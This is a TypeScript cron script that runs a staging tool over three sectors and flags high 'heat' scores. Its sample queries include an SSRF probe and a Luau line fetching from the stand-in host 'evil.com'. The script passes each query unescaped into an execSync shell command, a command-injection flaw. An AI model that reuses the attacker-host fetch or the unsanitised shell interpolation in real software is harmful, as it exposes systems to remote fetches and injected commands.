#!/usr/bin/env tsx
/**
 * src/staging/circadian-agent.ts
 *
 * Circadian Agent — One-off execution for system-level cron.
 * 
 * Orchestrates a single heartbeat across defined sectors.
 * Designed to be called by Mac 'cron' or 'launchd'.
 * 
 * Usage: npx tsx src/staging/circadian-agent.ts
 */

import { execSync } from 'child_process';

const SECTORS = [
  { name: 'arb', query: 'Unclaimed asset with high buyer score and 10 year dormancy' },
  { name: 'web', query: 'Potential SSRF vulnerability in remote image fetcher' },
  { name: 'luau', query: 'local remote = game:GetService("HttpService"):GetAsync("http://evil.com")' }
];

async function heartbeat() {
  const now = new Date().toISOString();
  console.log(`[circadian] Single heartbeat starting at ${now}`);

  for (const sector of SECTORS) {
    try {
      console.log(`[circadian] Running sector: ${sector.name}`);
      
      const cmd = `npx tsx src/staging/stage.ts --inline "${sector.query}" --sector ${sector.name}`;
      const output = execSync(cmd).toString();
      
      const heatMatch = output.match(/heat\s*:\s*([\d.]+)/);
      if (heatMatch) {
        const heat = parseFloat(heatMatch[1]);
        if (heat > 0.7) {
          console.warn(`[circadian] !!! HIGH OPPORTUNITY/HEAT DETECTED in ${sector.name}: ${heat} !!!`);
        }
      }
      
      console.log(`[circadian] ${sector.name} complete.`);
    } catch (err) {
      console.error(`[circadian] Sector ${sector.name} failed:`, err);
    }
  }
  
  console.log(`[circadian] Heartbeat cycle finished.`);
}

heartbeat().catch(err => {
  console.error('[circadian] Fatal heartbeat error:', err);
  process.exit(1);
});
